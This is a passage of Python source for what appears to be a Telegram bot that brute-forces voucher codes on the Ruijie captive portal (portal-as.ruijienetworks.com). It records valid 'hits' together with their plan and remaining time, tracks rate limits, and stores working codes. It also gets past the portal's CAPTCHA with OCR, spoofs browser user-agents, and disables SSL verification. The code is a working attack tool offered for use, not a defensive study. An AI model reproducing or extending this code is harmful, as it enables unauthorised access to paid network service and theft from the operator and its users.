    st = _stats(chat_id)
    st["current_code"] = code
    if 'logonUrl' in response:
        if recheck:
            return code
        if chat_id not in success_texts:
            success_texts[chat_id] = []
        profile_name, duration_str = await Code_Expires_Date(session_id, base_url)
        st["hits"].append((code, profile_name, duration_str))
        success_texts[chat_id].append(f"{code}   : {profile_name}, {duration_str}")
        results = db_get_results(str(chat_id))
        if code not in results:
            results.append(code)
            db_save_results(str(chat_id), results)
    elif 'STA' in response:
        st["limits"] += 1
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
    elif 'expired' in response.lower():
        st["expired"] += 1

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return '0 hr 0 min'
    try:
        mins = int(total_minutes)
        hours = mins // 60
        rem_minutes = mins % 60
        return f"{hours} hr {rem_minutes} min"
    except:
        return '0 hr 0 min'

async def Code_Expires_Date(active_id, base_url="https://portal-as.ruijienetworks.com"):
    paths = [
        f'{base_url}/api/macc2/balance/getBalance/{active_id}',
        f'{base_url}/api/macc/balance/getBalance/{active_id}',
        f'{base_url}/api/maccauth/balance/getBalance/{active_id}',
        f'{base_url}/api/auth/balance/getBalance/{active_id}'
    ]
    headers = {
        'authority': base_url.replace("https://", ""),
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }
    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(
        connector=_connector, connector_owner=False,
        cookie_jar=aiohttp.CookieJar(), timeout=timeout
    ) as fresh_session:
        for url in paths:
            try:
                async with fresh_session.get(url, headers=headers) as req:
                    if req.status == 200:
                        respond = await req.json()
                        if respond.get('success'):
                            result = respond.get('result', {})
                            raw_minutes = result.get('totalMinutes')
                            if raw_minutes is None:
                                raw_minutes = result.get('remainingMinutes')
                            profile_name = result.get('profileName', 'Unknown')
                            if raw_minutes is None:
                                totaltime = '0 hr 0 min'
                            else:
                                totaltime = Minute_to_Hour(raw_minutes)
                            return profile_name, totaltime
            except:
                continue
    return "Unknown", "0 hr 0 min"

# ==================== OCR ====================

_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    try:
        result = _ocr.classification(image_bytes)
        return result.upper() if result else None
    except Exception as e:
        print(f"OCR error: {e}")
        return None

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id, base_url="https://portal-as.ruijienetworks.com"):
    headers = {
        'authority': base_url.replace("https://", ""),
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'referer': f'{base_url}/download/static/maccauth/src/index.html?sessionId={session_id}',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session.get(f'{base_url}/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text, base_url="https://portal-as.ruijienetworks.com"):
    headers = {
        'authority': base_url.replace("https://", ""),
        'accept': '*/*', 'content-type': 'application/json',
        'origin': base_url,
        'referer': f'{base_url}/download/static/maccauth/src/index.html?sessionId={session_id}',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session.post(f'{base_url}/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        if data.get("success") == True:
            return session_id
        return None

# ==================== WEB SERVER ====================

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ==================== MAIN ====================

async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Polling error: {e}. Reconnect in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Polling error: {e}. Reconnect in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=TIMEOUT)
    _connector = aiohttp.TCPConnector(
        limit=CONNECTION_LIMIT, limit_per_host=CONNECTION_PER_HOST,
        ttl_dns_cache=300, ssl=False
    )
    session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)
    try:
        asyncio.create_task(web_server())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
